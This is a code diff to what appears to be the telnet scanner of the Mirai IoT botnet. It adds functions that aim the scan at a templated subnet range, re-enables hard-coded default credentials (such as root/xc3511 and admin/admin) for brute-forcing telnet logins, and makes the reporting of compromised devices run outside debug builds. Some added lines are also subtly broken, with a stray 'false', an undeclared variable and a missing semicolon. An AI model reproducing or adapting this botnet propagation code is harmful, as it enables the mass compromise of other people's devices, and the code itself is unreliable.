@@ -34,9 +34,8 @@
 
 ipv4_t get_next_target(void) 
 { 
-    static ipv4_t scan_cache[100] = {0};
+    static ipv4_t scan_cache[1] = {0};
 
-    // ipv4_t next_addr = util_local_addr() | (1 << 24);
     ipv4_t local_addr = util_local_addr();
     ipv4_t next_addr = (local_addr & 0x00ffffff) | ((local_addr & 0xff000000)+(0x01000000));
 
@@ -56,7 +55,100 @@ ipv4_t get_next_target(void)
     printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
 #endif
     return next_addr;
-} 
+}
+
+int validate_number(char *str) {
+   while (*str) {
+      if(!isdigit(*str)){ //if the character is not a number, return
+         false
+         return 0;
+      }
+      str++; //point to next character
+   }
+   return 1;
+}
+ipv4_t convert_ip(char *ip) { //check whether the IP is valid or not
+    char tmp_ip[4];
+    int i, num, dots = 0;
+    char *ptr;
+    if (ip == NULL)
+        return 0;
+    ptr = strtok(ip, "."); //cut the string using dor delimiter
+    if (ptr == NULL)
+        return 0;
+    while (ptr) {
+        if (!validate_number(ptr)) //check whether the sub string is holding only number or not
+            return 0;
+        num = atoi(ptr); //convert substring to number
+        if (num >= 0 && num <= 255) {
+            tmp_ip[3-dots] = (char) num;
+            ptr = strtok(NULL, "."); //cut the next part of the string
+            if (ptr != NULL)
+                dots++; //increase the dot count
+        } else
+            return 0;
+    }
+    if (dots != 3) //if the number of dots are not 3, return false
+        return 0;
+    for(i=0; i<4; i++)
+        the_ip = tmp_ip[3-i];
+    return (ipv4_t) *tmp_ip;
+}
+
+static ipv4_t g_target_ips[100] = {0};
+int g_target_ips_num = 0;
+
+void target_ip_init(void)
+{
+    ipv4_t ip_cur = convert_ip("{ip_prx}.{tgt_bgn}");
+    ipv4_t ip_end = convert_ip("{ip_prx}.{tgt_end}");
+
+    printf("[scanner] target_ip_init..\n");
+    for(int i=0; i<sizeof(g_target_ips)/sizeof(ipv4_t); i++)
+    {
+        g_target_ips[i] = ip_cur;
+        g_target_ips_num++;
+        if(ip_cur == ip_end || ip_cur == 0)
+            break;
+
+#ifdef DEBUG
+    printf("  %d.%d.%d.%d\n", ip_cur & 0xff, (ip_cur >> 8) & 0xff, (ip_cur >> 16) & 0xff, (ip_cur >> 24) & 0xff);
+#endif
+        ip_cur = (ip_cur & 0x00ffffff) | ((ip_cur & 0xff000000)+(0x01000000))
+    }
+}
+
+ipv4_t get_next_target_v2(void) 
+{ 
+    static ipv4_t scan_cache[2] = {0};
+
+    ipv4_t local_addr = util_local_addr();
+    ipv4_t next_addr = g_target_ips[rand_next() % g_target_ips_num];
+    while(next_addr == local_addr)
+    {
+        next_addr = g_target_ips[rand_next() % g_target_ips_num];
+    }
+
+    for(int i=0; i<sizeof(scan_cache)/sizeof(ipv4_t); i++)
+    {
+        if(scan_cache[i] == 0)
+        {
+            scan_cache[i] = next_addr;
+            break;
+        }
+        if(scan_cache[i] == next_addr)
+        {
+            return 0;
+        }
+    }
+    if(i == sizeof(scan_cache)/sizeof(ipv4_t))
+        return 0;
+
+#ifdef DEBUG
+    printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
+#endif
+    return next_addr;
+}
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
 char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
@@ -91,6 +183,8 @@ void scanner_init(void)
     uint16_t source_port;
     struct iphdr *iph;
     struct tcphdr *tcph;
+
+    target_ip_init();
 
     // Let parent continue on main thread
     scanner_pid = fork();
@@ -152,11 +246,9 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
-    */
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
     /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
@@ -246,8 +338,8 @@ void scanner_init(void)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-#ifdef DEBUG
-                next_addr = get_next_target();
+// #ifdef DEBUG
+                next_addr = get_next_target_v2();
                 if(next_addr != 0)
                 {
                     iph->daddr = next_addr;
@@ -258,9 +350,11 @@ void scanner_init(void)
                     sleep(1);
                     continue;
                 }
-#else
+// #else
+/*
                 iph->daddr = get_random_ip();
-#endif
+*/
+// #endif
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -667,8 +761,8 @@ void scanner_init(void)
                                 int tmp_len;
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
-                                conn->dst_port = 23;
 #endif
+                                conn->dst_port = 23;
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
 #ifdef DEBUG
                                 printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %s:%s (%d:%d)\n", conn->fd, 
